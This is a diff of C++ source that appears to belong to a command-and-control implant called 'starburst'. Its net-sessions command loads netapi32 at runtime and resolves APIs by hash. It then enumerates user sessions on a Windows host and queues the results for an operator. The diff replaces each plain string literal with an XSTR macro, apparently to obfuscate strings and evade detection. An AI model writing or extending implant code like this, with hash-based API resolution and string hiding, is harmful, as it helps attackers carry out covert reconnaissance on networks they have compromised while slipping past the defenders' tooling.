@@ -30,7 +30,7 @@ auto declfn starburst::cmd_net_sessions(
     auto h_netapi = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA( _n ) );
     if ( !h_netapi ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "LoadLibrary netapi32 failed" ) ) );
+            XSTR( "LoadLibrary netapi32 failed" ) );
         return;
     }
 
@@ -42,7 +42,7 @@ auto declfn starburst::cmd_net_sessions(
             expr::hash_string( "NetApiBufferFree" ) ) );
     if ( !pNetSessionEnum || !pNetApiBufferFree ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "API resolution failed" ) ) );
+            XSTR( "API resolution failed" ) );
         return;
     }
 
@@ -68,7 +68,7 @@ auto declfn starburst::cmd_net_sessions(
 
     if ( status != 0 && status != 234 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "NetSessionEnum failed" ) ) );
+            XSTR( "NetSessionEnum failed" ) );
         return;
     }
 
@@ -77,13 +77,12 @@ auto declfn starburst::cmd_net_sessions(
     if ( !output ) {
         pNetApiBufferFree( buf );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
     uint32_t off = 0;
 
-    str_copy( output + off, symbol<char*>( const_cast<char*>(
-        "Client\tUser\tTime\tIdleTime\n" ) ) );
+    str_copy( output + off, XSTR("Client\tUser\tTime\tIdleTime\n") );
     off = str_len( output );
 
     auto sessions = reinterpret_cast<SESSION_INFO_10*>( buf );
